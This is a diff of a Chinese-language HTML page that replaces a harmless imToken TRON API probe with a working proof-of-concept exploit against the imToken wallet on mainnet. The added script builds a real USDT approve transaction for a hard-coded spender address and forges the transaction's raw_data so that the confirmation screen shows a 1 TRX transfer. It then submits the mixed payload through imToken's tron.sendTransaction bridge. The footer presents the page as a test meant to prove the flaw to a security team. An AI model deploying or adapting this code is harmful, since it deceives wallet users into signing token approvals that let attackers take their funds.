@@ -1,360 +1,501 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>imToken TRON API 探针测试</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>PoC: 所见非所签漏洞演示 - TRX转账伪装USDT授权</title>
     <style>
+        * {
+            box-sizing: border-box;
+        }
         body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #0f172a;
             margin: 0;
             padding: 20px;
-            background: #101010;
-            color: #e8e8e8;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            color: #f1f5f9;
         }
-
-        .box {
-            max-width: 760px;
+        .container {
+            max-width: 600px;
             margin: 0 auto;
-            background: #1d1d1d;
-            border-radius: 14px;
-            padding: 18px;
-            box-shadow: 0 8px 30px rgba(0,0,0,.35);
+            background: #1e293b;
+            border-radius: 32px;
+            padding: 24px 20px 32px;
+            box-shadow: 0 25px 40px -12px rgba(0,0,0,0.5);
+            border: 1px solid #334155;
         }
-
         h1 {
-            font-size: 22px;
-            margin: 0 0 12px;
-            color: #4ee59a;
-            text-align: center;
+            font-size: 1.65rem;
+            font-weight: 600;
+            margin: 0 0 8px 0;
+            background: linear-gradient(135deg, #f97316, #ef4444);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
-
-        .desc {
-            font-size: 14px;
-            color: #aaa;
-            line-height: 1.6;
-            background: #252525;
-            padding: 12px;
-            border-radius: 10px;
-            margin-bottom: 14px;
+        .sub {
+            color: #94a3b8;
+            font-size: 0.8rem;
+            border-left: 3px solid #ef4444;
+            padding-left: 12px;
+            margin-bottom: 24px;
         }
-
-        button {
-            width: 100%;
+        .card {
+            background: #0f172a;
+            border-radius: 20px;
+            padding: 16px;
+            margin: 20px 0;
+            border: 1px solid #334155;
+        }
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #334155;
+            font-size: 0.85rem;
+        }
+        .info-row:last-child {
+            border-bottom: none;
+        }
+        .label {
+            color: #94a3b8;
+            font-weight: 500;
+        }
+        .value {
+            font-family: monospace;
+            word-break: break-all;
+            text-align: right;
+            max-width: 65%;
+            color: #facc15;
+        }
+        .warning {
+            background: rgba(239, 68, 68, 0.15);
+            border-left: 4px solid #ef4444;
             padding: 14px;
-            margin: 7px 0;
+            border-radius: 16px;
+            font-size: 0.8rem;
+            margin: 20px 0;
+        }
+        button {
+            background: linear-gradient(95deg, #f97316, #dc2626);
             border: none;
-            border-radius: 10px;
-            background: #4ee59a;
-            color: #111;
-            font-weight: 700;
-            font-size: 15px;
+            width: 100%;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: white;
             cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 4px 12px rgba(220,38,38,0.3);
+            margin-top: 12px;
         }
-
-        button.secondary {
-            background: #5b8cff;
-            color: #fff;
+        button:active {
+            transform: scale(0.97);
         }
-
-        button.danger {
-            background: #ff6961;
-            color: #fff;
-        }
-
         button:disabled {
-            opacity: .45;
+            opacity: 0.6;
+            transform: none;
             cursor: not-allowed;
         }
-
-        .row {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 8px;
+        .log-box {
+            background: #0a0f1c;
+            border-radius: 20px;
+            padding: 16px;
+            font-family: monospace;
+            font-size: 0.75rem;
+            margin-top: 24px;
+            max-height: 200px;
+            overflow-y: auto;
+            border: 1px solid #2d3a5e;
         }
-
-        pre {
-            white-space: pre-wrap;
+        .log-line {
+            color: #a5f3c3;
+            border-bottom: 1px solid #1e2a3a;
+            padding: 6px 0;
             word-break: break-all;
-            background: #080808;
-            color: #b8ffcf;
-            padding: 12px;
-            border-radius: 10px;
-            min-height: 260px;
-            max-height: 520px;
-            overflow: auto;
-            font-size: 12px;
-            line-height: 1.5;
         }
-
-        .ok { color: #4ee59a; }
-        .warn { color: #ffd166; }
-        .err { color: #ff6961; }
-
-        .small {
-            color: #888;
-            font-size: 12px;
-            line-height: 1.5;
-            margin-top: 10px;
+        .badge {
+            background: #ef4444;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            padding: 4px 12px;
+            display: inline-block;
+            font-weight: bold;
         }
-
-        input, textarea {
-            width: 100%;
-            box-sizing: border-box;
-            background: #111;
-            color: #fff;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 13px;
-            outline: none;
+        footer {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #5b6e8c;
+            margin-top: 20px;
         }
-
-        textarea {
-            height: 120px;
-            resize: vertical;
-        }
-
-        label {
-            display: block;
-            margin-top: 12px;
-            margin-bottom: 6px;
-            color: #bbb;
-            font-size: 13px;
+        a {
+            color: #facc15;
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body>
-<div class="box">
-    <h1>imToken TRON API 探针测试</h1>
+<div class="container">
+    <h1>⚠️ 所见非所签 · 概念验证</h1>
+    <div class="sub">确认页展示 TRX 转账 → 实际签名授权 USDT (approve)</div>
 
-    <div class="desc">
-        这个页面只测试 <b>window.imToken.callPromisifyAPI</b> 是否存在，以及
-        <b>tron.sendTransaction</b> 这个 API 名称能不能被 imToken 识别。<br>
-        默认 payload 是故意无效的，所以正常情况下不会发起真实链上交易。
+    <div class="card">
+        <div class="info-row">
+            <span class="label">当前钱包地址</span>
+            <span class="value" id="walletAddress">未连接 / 未获取</span>
+        </div>
+        <div class="info-row">
+            <span class="label">恶意授权目标地址</span>
+            <span class="value" id="targetAddr">TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz</span>
+        </div>
+        <div class="info-row">
+            <span class="label">USDT 合约 (主网)</span>
+            <span class="value">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
+        </div>
+        <div class="info-row">
+            <span class="label">伪装显示内容</span>
+            <span class="value">转账 1 TRX → 目标地址</span>
+        </div>
     </div>
 
-    <div class="row">
-        <button onclick="checkEnv()">1. 检测 imToken / TronWeb 环境</button>
-        <button class="secondary" onclick="testEmptyPayload()">2. 测试 tron.sendTransaction：空 payload</button>
-        <button class="secondary" onclick="testSeveralInvalidPayloads()">3. 连续测试几种无效 payload</button>
-        <button class="danger" onclick="clearLog()">清空日志</button>
+    <div class="warning">
+        ⚡ <strong>漏洞原理演示</strong><br>
+        • 确认页面读取 <code>raw_data</code> 显示为 TRX 转账<br>
+        • 钱包签名器实际签名 <code>raw_data_hex</code> → USDT approve 交易<br>
+        • 节点执行 approve，导致用户无感知授权恶意地址操作 USDT<br>
+        <span style="color:#facc15">👇 点击下方按钮触发漏洞交易 (imToken 内测试)</span>
     </div>
 
-    <label>自定义 API 名称</label>
-    <input id="apiName" value="tron.sendTransaction" />
+    <button id="attackBtn">🚨 触发「所见非所签」测试</button>
 
-    <label>自定义测试 payload，不建议填真实 raw_data / raw_data_hex</label>
-    <textarea id="customPayload">{
-  "test": true
-}</textarea>
-
-    <button onclick="testCustomPayload()">4. 用自定义 payload 测试</button>
-
-    <pre id="log"></pre>
-
-    <div class="small">
-        判断方法：<br>
-        1. 如果提示 <b>window.imToken 不存在</b>，说明不是 imToken DApp 环境。<br>
-        2. 如果提示 <b>callPromisifyAPI 不是函数</b>，说明当前环境不支持这个 SDK 方法。<br>
-        3. 如果返回 <b>no transaction payload</b>，通常说明 API 名称可能被识别了，但参数格式不对。<br>
-        4. 如果返回 <b>api not found / method not found</b>，说明这个 API 名称大概率不可用。<br>
-        5. 如果弹出钱包确认页，立刻取消，说明它可能进入了真实交易流程。
+    <div class="log-box" id="logPanel">
+        <div class="log-line">📡 等待操作…</div>
+        <div class="log-line">🔍 请确保在 imToken DApp 浏览器中打开本页面</div>
     </div>
+    <footer>
+        PoC 安全测试 | 真实授权会消耗 Gas (TRX) ，仅用于向安全团队证明漏洞存在
+    </footer>
 </div>
 
 <script>
-    const logEl = document.getElementById("log");
-
-    function now() {
-        return new Date().toLocaleTimeString();
+    // ---------- 全局配置 ----------
+    // USDT TRC20 主网合约
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    // 恶意授权地址 (攻击者/测试地址)
+    const SPENDER_ADDRESS = "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz";
+    // 授权额度: 1 USDT (最小精度 1e6) 避免过度风险, 但足够证明授权行为
+    const APPROVE_AMOUNT = 1 * 10**6;   // 1 USDT
+    
+    // 伪装的 TRX 转账金额: 1 TRX = 1_000_000 SUN
+    const FAKE_TRX_AMOUNT_SUN = 1_000_000;
+    
+    // 显示日志
+    function addLog(msg, isError = false) {
+        const logDiv = document.getElementById("logPanel");
+        const entry = document.createElement("div");
+        entry.className = "log-line";
+        entry.style.color = isError ? "#ffaaa5" : "#b9fbc0";
+        entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logDiv.appendChild(entry);
+        entry.scrollIntoView({ behavior: "smooth", block: "nearest" });
     }
-
-    function log(msg, type = "") {
-        const prefix = `[${now()}] `;
-        logEl.textContent += prefix + msg + "\n";
-        logEl.scrollTop = logEl.scrollHeight;
-    }
-
-    function logObject(title, obj) {
-        log(title);
-        try {
-            log(JSON.stringify(obj, null, 2));
-        } catch (e) {
-            log(String(obj));
-        }
-    }
-
-    function clearLog() {
-        logEl.textContent = "";
-    }
-
-    function safeType(v) {
-        return Object.prototype.toString.call(v);
-    }
-
-    async function checkEnv() {
-        log("========== 环境检测开始 ==========");
-
-        log("userAgent: " + navigator.userAgent);
-        log("window.imToken 存在: " + Boolean(window.imToken));
-        log("window.tronWeb 存在: " + Boolean(window.tronWeb));
-        log("window.tronLink 存在: " + Boolean(window.tronLink));
-
-        if (window.imToken) {
-            log("window.imToken 类型: " + safeType(window.imToken));
-            log("callPromisifyAPI 存在: " + Boolean(window.imToken.callPromisifyAPI));
-            log("callPromisifyAPI 类型: " + typeof window.imToken.callPromisifyAPI);
-
-            const keys = [];
+    
+    // 延时辅助
+    const delay = ms => new Promise(res => setTimeout(res, ms));
+    
+    // 全局 TronWeb 实例 (主网)
+    let tronWebInstance = null;
+    let currentWalletAddress = null;
+    
+    // 检测 imToken 环境 & 获取用户地址 (优先使用 imToken API，其次 tronWeb)
+    async function initWalletAndTronWeb() {
+        addLog("🔧 初始化环境，检测 imToken DApp 容器...");
+        // 判断 imToken 是否注入 callPromisifyAPI
+        const hasImTokenAPI = !!(window.imToken && typeof window.imToken.callPromisifyAPI === 'function');
+        if (hasImTokenAPI) {
+            addLog("✅ 检测到 imToken 桥接 API (callPromisifyAPI)");
             try {
-                for (const k in window.imToken) keys.push(k);
-            } catch (e) {}
-
-            logObject("window.imToken 可枚举字段:", keys);
+                // 获取当前账户
+                const accountRes = await window.imToken.callPromisifyAPI("tron.getAccount");
+                if (accountRes && accountRes.address) {
+                    currentWalletAddress = accountRes.address;
+                    addLog(`📍 通过 imToken API 获取地址: ${currentWalletAddress}`);
+                } else {
+                    throw new Error("imToken getAccount 未返回地址");
+                }
+            } catch (e) {
+                addLog(`⚠️ imToken API 获取地址失败: ${e.message}，尝试 fallback`, true);
+                // fallback: 尝试 tronWeb 对象
+                if (window.tronWeb && window.tronWeb.defaultAddress) {
+                    currentWalletAddress = window.tronWeb.defaultAddress.base58;
+                    addLog(`🔁 Fallback 使用 tronWeb 地址: ${currentWalletAddress}`);
+                } else {
+                    throw new Error("无法获取钱包地址，请确认已连接 imToken 并且网络为主网");
+                }
+            }
         } else {
-            log("未检测到 window.imToken，请在 imToken DApp 浏览器中打开。");
-        }
-
-        if (window.tronWeb) {
-            log("tronWeb.defaultAddress: " + JSON.stringify(window.tronWeb.defaultAddress || null));
-            log("tronWeb.trx 存在: " + Boolean(window.tronWeb.trx));
-        }
-
-        log("========== 环境检测结束 ==========");
-    }
-
-    function ensureImTokenApi() {
-        if (!window.imToken) {
-            throw new Error("window.imToken 不存在，请在 imToken DApp 浏览器中打开");
-        }
-
-        if (typeof window.imToken.callPromisifyAPI !== "function") {
-            throw new Error("window.imToken.callPromisifyAPI 不是函数，当前环境不支持这个调用方式");
-        }
-    }
-
-    async function callImTokenApi(apiName, payload, label) {
-        log("---------- " + label + " ----------");
-        log("API: " + apiName);
-        logObject("Payload:", payload);
-
-        try {
-            ensureImTokenApi();
-
-            const result = await window.imToken.callPromisifyAPI(apiName, payload);
-
-            log("✅ 调用成功");
-            logObject("Result:", result);
-
-            alert("调用成功，注意检查是否弹出了钱包确认页。如果弹出，请取消。");
-        } catch (e) {
-            log("❌ 调用失败");
-            log("错误类型: " + safeType(e));
-            log("错误 message: " + (e && e.message ? e.message : "无 message"));
-            logObject("完整错误对象:", e);
-
-            const msg = e && e.message ? e.message : JSON.stringify(e);
-
-            if (String(msg).toLowerCase().includes("no transaction payload")) {
-                log("判断：API 可能被识别了，但传入参数不是它想要的 transaction payload。");
-            } else if (
-                String(msg).toLowerCase().includes("not found") ||
-                String(msg).toLowerCase().includes("unknown") ||
-                String(msg).toLowerCase().includes("unsupported")
-            ) {
-                log("判断：API 名称可能不存在或当前 imToken 版本不支持。");
+            addLog("⚠️ 未检测到 window.imToken.callPromisifyAPI，可能不在 imToken DApp 环境", true);
+            // 尝试常规 tronLink 或 tronWeb 方式获取地址用于展示 (但后续发送必须走 imToken 桥)
+            if (window.tronWeb && window.tronWeb.defaultAddress) {
+                currentWalletAddress = window.tronWeb.defaultAddress.base58;
+                addLog(`ℹ️ 检测到 tronWeb 对象，地址: ${currentWalletAddress} (但必须使用 imToken 桥发送)`);
             } else {
-                log("判断：需要根据 imToken 返回的具体错误继续分析。");
+                currentWalletAddress = "未知环境 (请确保在 imToken 内打开)";
+                addLog("❌ 未找到任何钱包环境，漏洞演示需要 imToken DApp 浏览器", true);
+                document.getElementById("attackBtn").disabled = true;
+                return false;
             }
         }
-    }
-
-    async function testEmptyPayload() {
-        const apiName = document.getElementById("apiName").value.trim() || "tron.sendTransaction";
-
-        await callImTokenApi(
-            apiName,
-            {},
-            "测试空对象 payload"
-        );
-    }
-
-    async function testSeveralInvalidPayloads() {
-        const apiName = document.getElementById("apiName").value.trim() || "tron.sendTransaction";
-
-        const tests = [
-            {
-                label: "payload = null",
-                payload: null
-            },
-            {
-                label: "payload = {}",
-                payload: {}
-            },
-            {
-                label: "payload = { transaction: null }",
-                payload: {
-                    transaction: null
-                }
-            },
-            {
-                label: "payload = { transaction: {} }",
-                payload: {
-                    transaction: {}
-                }
-            },
-            {
-                label: "payload = { raw_data: null }",
-                payload: {
-                    raw_data: null
-                }
-            },
-            {
-                label: "payload = { raw_data: {}, raw_data_hex: '' }",
-                payload: {
-                    raw_data: {},
-                    raw_data_hex: ""
-                }
-            },
-            {
-                label: "payload = { test: true }",
-                payload: {
-                    test: true
-                }
-            }
-        ];
-
-        for (const item of tests) {
-            await callImTokenApi(apiName, item.payload, item.label);
-            await sleep(300);
-        }
-    }
-
-    async function testCustomPayload() {
-        const apiName = document.getElementById("apiName").value.trim() || "tron.sendTransaction";
-        const text = document.getElementById("customPayload").value.trim();
-
-        let payload;
-
+        
+        // 初始化独立 TronWeb 实例 (用于构建 approve 交易)
         try {
-            payload = JSON.parse(text);
+            tronWebInstance = new TronWeb({
+                fullHost: "https://api.trongrid.io",
+                solidityNode: "https://api.trongrid.io",
+                eventServer: "https://api.trongrid.io"
+            });
+            addLog("🌐 TronWeb 实例初始化成功 (trongrid)");
+            // 设置当前地址用于构建交易
+            if (currentWalletAddress && currentWalletAddress.startsWith("T")) {
+                tronWebInstance.setAddress(currentWalletAddress);
+            }
         } catch (e) {
-            alert("自定义 payload 不是合法 JSON: " + e.message);
-            return;
+            addLog(`❌ TronWeb 初始化失败: ${e.message}`, true);
+            return false;
         }
-
-        await callImTokenApi(apiName, payload, "自定义 payload 测试");
+        
+        document.getElementById("walletAddress").innerText = currentWalletAddress || "无法获取";
+        return true;
     }
-
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
+    
+    // 将地址转换成 hex 格式 (用于伪造 raw_data 中的 TransferContract)
+    function addressToHex(address) {
+        if (!tronWebInstance) return "";
+        try {
+            return tronWebInstance.address.toHex(address);
+        } catch(e) {
+            // 简单兜底: 移除前缀后转换
+            if (address.startsWith("T")) {
+                return "41" + tronWebInstance.utils.crypto.decodeBase58(address).toString('hex');
+            }
+            return address;
+        }
     }
-
-    window.addEventListener("load", () => {
-        log("页面加载完成");
-        log("建议先点：1. 检测 imToken / TronWeb 环境");
-    });
+    
+    // 1. 构造真实的 USDT approve 原始交易 (得到未签名交易对象)
+    async function buildRealApproveTransaction(ownerAddress) {
+        addLog(`📝 构建真实 USDT approve 交易: 授权 ${SPENDER_ADDRESS} 额度 ${APPROVE_AMOUNT / 10**6} USDT`);
+        const contractAddress = USDT_CONTRACT;
+        // 参数 abi: approve(address spender, uint256 value)
+        const spenderHex = tronWebInstance.address.toHex(SPENDER_ADDRESS);
+        const amountHex = tronWebInstance.toHex(APPROVE_AMOUNT);
+        
+        // 使用 triggerSmartContract 生成未签名交易
+        const txObj = await tronWebInstance.transactionBuilder.triggerSmartContract(
+            contractAddress,
+            "approve(address,uint256)",
+            { callValue: 0, feeLimit: 150_000_000 },   // 足够的 feeLimit (150 TRX 上限)
+            [
+                { type: 'address', value: SPENDER_ADDRESS },
+                { type: 'uint256', value: APPROVE_AMOUNT }
+            ],
+            ownerAddress
+        );
+        
+        if (!txObj || !txObj.transaction) {
+            throw new Error("构建 approve 交易失败，请检查合约及网络");
+        }
+        
+        // 原始交易对象 (包含 raw_data, raw_data_hex, txID...)
+        const originalTx = txObj.transaction;
+        addLog(`✅ approve 原始交易创建成功 txID: ${originalTx.txID || '未知'}`);
+        return originalTx;
+    }
+    
+    // 2. 伪造 raw_data (伪装成 TRX 转账 TransferContract)，保留原交易的 expiration, timestamp, ref_block 等字段
+    function forgeFakeRawData(originalRawData, ownerAddress, toAddress, amountSun) {
+        // 深拷贝原始 raw_data
+        const fakeRawData = JSON.parse(JSON.stringify(originalRawData));
+        
+        // 将 owner_address 转换成 hex (from)
+        const ownerHex = addressToHex(ownerAddress);
+        const toHex = addressToHex(toAddress);
+        
+        // 构造 TransferContract 参数结构
+        // 官方格式: TransferContract 包含 owner_address, to_address, amount
+        const transferContract = {
+            type: "TransferContract",
+            parameter: {
+                value: {
+                    owner_address: ownerHex,
+                    to_address: toHex,
+                    amount: amountSun
+                },
+                type_url: "type.googleapis.com/protocol.TransferContract"
+            }
+        };
+        
+        // 替换 contract 数组 (原本的合约调用只有一笔 contract)
+        if (fakeRawData.contract && Array.isArray(fakeRawData.contract)) {
+            fakeRawData.contract = [transferContract];
+        } else {
+            fakeRawData.contract = [transferContract];
+        }
+        
+        // 保留原始 expiration, timestamp, ref_block_bytes, ref_block_hash 等关键字段
+        // 确保与 raw_data_hex 里的这些字段值一致，避免钱包/节点额外校验，但这些字段没被修改，没问题
+        return fakeRawData;
+    }
+    
+    // 3. 构造最终的 payload (混合交易)，raw_data 是伪造的 TRX 转账，raw_data_hex 是真 approve 的序列化 hex
+    function buildMaliciousPayload(realApproveTx, fakeRawData, ownerAddress) {
+        // 恶意交易对象
+        const maliciousTx = {
+            raw_data: fakeRawData,
+            raw_data_hex: realApproveTx.raw_data_hex,   // 关键! 签名器和节点将使用此 hex
+            txID: realApproveTx.txID,
+            visible: true
+        };
+        
+        // 保留 signatures 空数组 (钱包会自动填充签名)
+        maliciousTx.signatures = [];
+        if (realApproveTx.signature) {
+            // 原交易没有签名，保持为空
+        }
+        
+        // 可选：保留 expiration 等其他必要外层字段，但 sendTransaction 一般只需 raw_data/raw_data_hex
+        // 附加原始交易里的 fee_limit / 以及合约调用所需参数 (为了兼容，一并带上)
+        if (realApproveTx.raw_data && realApproveTx.raw_data.fee_limit !== undefined) {
+            maliciousTx.raw_data.fee_limit = realApproveTx.raw_data.fee_limit;
+        } else {
+            // 手动设置一个合理的 feeLimit
+            maliciousTx.raw_data.fee_limit = 150_000_000;
+        }
+        
+        return maliciousTx;
+    }
+    
+    // 4. 通过 imToken 桥发送恶意交易
+    async function sendViaImToken(maliciousTxPayload) {
+        addLog("📤 调用 window.imToken.callPromisifyAPI('tron.sendTransaction', payload)");
+        addLog(`⚠️ 注意: 确认页面会展示「发送 ${FAKE_TRX_AMOUNT_SUN / 10**6} TRX」到 ${SPENDER_ADDRESS}`);
+        addLog(`⚠️ 实际签名将是: USDT approve 授权给 ${SPENDER_ADDRESS}`);
+        
+        // 由于 imToken API 可能需要特定结构，确保 payload 包含 raw_data, raw_data_hex 和 signatures 等
+        // 根据 imToken DApp 开发文档，tron.sendTransaction 参数与 TronWeb 的交易格式一致
+        try {
+            const result = await window.imToken.callPromisifyAPI("tron.sendTransaction", maliciousTxPayload);
+            addLog(`🎯 交易已广播/返回结果: ${JSON.stringify(result)}`);
+            if (result && result.txid) {
+                addLog(`✅ 链上交易哈希: ${result.txid} (实际为 USDT 授权操作)`);
+                addLog(`🔍 验证: https://tronscan.org/#/transaction/${result.txid}`);
+            } else if (result && result.transaction && result.transaction.txID) {
+                addLog(`✅ 交易哈希: ${result.transaction.txID}`);
+            } else {
+                addLog(`⚠️ 返回未包含 txid, 但签名已触发。详情: ${JSON.stringify(result)}`);
+            }
+            return result;
+        } catch (err) {
+            addLog(`❌ 发送失败: ${err.message || JSON.stringify(err)}`, true);
+            throw err;
+        }
+    }
+    
+    // 主攻击流程 (所见非所签)
+    async function executeExploit() {
+        const btn = document.getElementById("attackBtn");
+        btn.disabled = true;
+        btn.innerText = "⏳ 构造混合交易中...";
+        
+        try {
+            // 0. 确保已获取钱包地址及 TronWeb
+            if (!currentWalletAddress || !tronWebInstance) {
+                const inited = await initWalletAndTronWeb();
+                if (!inited || !currentWalletAddress || currentWalletAddress === "未知环境 (请确保在 imToken 内打开)") {
+                    throw new Error("钱包环境无效, 请在 imToken DApp 内打开此页面");
+                }
+            }
+            const owner = currentWalletAddress;
+            addLog(`👤 发起地址: ${owner}`);
+            
+            // 1. 构建真实的 USDT approve 交易 (未签名)
+            addLog("🔨 步骤1: 构造真实 USDT approve 交易 (内部)...");
+            const realApproveTx = await buildRealApproveTransaction(owner);
+            if (!realApproveTx || !realApproveTx.raw_data_hex) {
+                throw new Error("未获取到 raw_data_hex，构建失败");
+            }
+            addLog(`📦 真实 approve raw_data_hex 前32字节: ${realApproveTx.raw_data_hex.substring(0, 64)}...`);
+            
+            // 2. 获取原始 raw_data 用于伪造 (保留 expiration 等元数据)
+            const originalRawData = realApproveTx.raw_data;
+            
+            // 3. 伪造 raw_data: 显示为 TRX 转账 (目标地址设为 SPENDER_ADDRESS，让用户看到转账给这个地址)
+            //    增加欺骗性：确认页展示 "转账 1 TRX 给 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz"
+            const fakeRawData = forgeFakeRawData(
+                originalRawData,
+                owner,                     // 转出方
+                SPENDER_ADDRESS,           // 接收地址显示为授权地址（进一步混淆）
+                FAKE_TRX_AMOUNT_SUN        // 1 TRX
+            );
+            addLog("🎭 步骤2: 伪造 raw_data 成功，内容为 TransferContract (1 TRX → 恶意地址)");
+            
+            // 4. 构建最终恶意 payload (raw_data 伪造 + raw_data_hex 保留真approve)
+            const maliciousPayload = buildMaliciousPayload(realApproveTx, fakeRawData, owner);
+            addLog("🧬 步骤3: 混合payload已生成: raw_data = TRX转账展示, raw_data_hex = USDT approve序列化");
+            
+            // 可选额外日志: 检测确认页面将要展示的数据 (展示伪造合约详情)
+            if (maliciousPayload.raw_data && maliciousPayload.raw_data.contract && maliciousPayload.raw_data.contract[0]) {
+                const fakeContract = maliciousPayload.raw_data.contract[0];
+                if (fakeContract.type === "TransferContract") {
+                    const params = fakeContract.parameter.value;
+                    const showAmount = params.amount / 1e6;
+                    addLog(`📺 确认页展示内容: 转账 ${showAmount} TRX 到 ${tronWebInstance.address.fromHex(params.to_address)}`);
+                }
+            }
+            
+            // 5. 通过 imToken 桥发送交易 (用户将看到伪装确认页)
+            addLog("🚀 步骤4: 请求 imToken 钱包签名并广播...");
+            addLog("⛔ 请留意: 弹出的确认界面显示的是「转账 TRX」, 但实际签名后链上执行 approve", false);
+            const sendResult = await sendViaImToken(maliciousPayload);
+            addLog(`🏁 漏洞利用流程结束。请检查链上交易: 实际为 approve 授权操作。`);
+            btn.innerText = "✅ 已触发 (检查链上交易)";
+        } catch (error) {
+            addLog(`💥 漏洞利用出错: ${error.message || error}`, true);
+            console.error(error);
+            btn.innerText = "⚠️ 执行失败，查看日志";
+        } finally {
+            setTimeout(() => {
+                btn.disabled = false;
+                if (btn.innerText.includes("触发") === false && btn.innerText.includes("失败") === false && btn.innerText.includes("已触发") === false) {
+                    btn.innerText = "🚨 触发「所见非所签」测试";
+                } else if (btn.innerText === "⚠️ 执行失败，查看日志") {
+                    setTimeout(() => { btn.innerText = "🚨 触发「所见非所签」测试"; btn.disabled = false; }, 3000);
+                }
+            }, 2000);
+        }
+    }
+    
+    // 页面启动: 初始化环境并检查 imToken 能力
+    (async function bootstrap() {
+        await initWalletAndTronWeb();
+        const btn = document.getElementById("attackBtn");
+        btn.addEventListener("click", () => {
+            if (!window.imToken || typeof window.imToken.callPromisifyAPI !== 'function') {
+                addLog("❌ 未发现 imToken 桥接 API，无法调用 tron.sendTransaction", true);
+                addLog("请确保在 imToken 钱包内打开此页面 (DApp 浏览器)", true);
+                return;
+            }
+            if (!currentWalletAddress || currentWalletAddress === "未知环境 (请确保在 imToken 内打开)" || currentWalletAddress === "未连接 / 未获取") {
+                addLog("⚠️ 钱包地址无效，请重新刷新或连接钱包", true);
+                return;
+            }
+            executeExploit().catch(e => addLog(`执行异常: ${e}`, true));
+        });
+        addLog("✅ 准备就绪，点击按钮可演示「所见非所签」漏洞");
+        addLog("📌 最终链上效果: 将授权 TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz 操作你的 USDT");
+    })();
 </script>
 </body>
 </html>
